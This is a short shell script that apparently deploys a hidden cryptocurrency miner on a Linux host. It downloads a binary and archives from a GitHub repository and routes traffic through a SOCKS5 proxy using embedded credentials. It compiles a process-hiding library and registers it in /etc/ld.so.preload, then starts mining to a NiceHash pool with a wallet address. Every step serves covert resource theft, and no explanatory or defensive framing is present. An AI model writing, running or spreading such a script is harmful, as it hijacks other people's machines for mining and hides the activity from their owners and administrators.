#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/gunturyogatama404/asdacascdasd/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 18.223.155.101:1080
socks5_username = sempakcok
socks5_password = gunturmanis
END

wget https://raw.githubusercontent.com/gunturyogatama404/asdacascdasd/main/pepek

chmod +x pepek

wget https://raw.githubusercontent.com/gunturyogatama404/asdacascdasd/main/pepek.zip

unzip pepek.zip

make

gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl

mv libprocesshider.so /usr/local/lib/

echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./pepek --url=ssl://3DWPbhBLe3RC4dHP8Y6Wz3QCorqJw4Bgcy@daggerhashimoto.usa-east.nicehash.com:33353 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
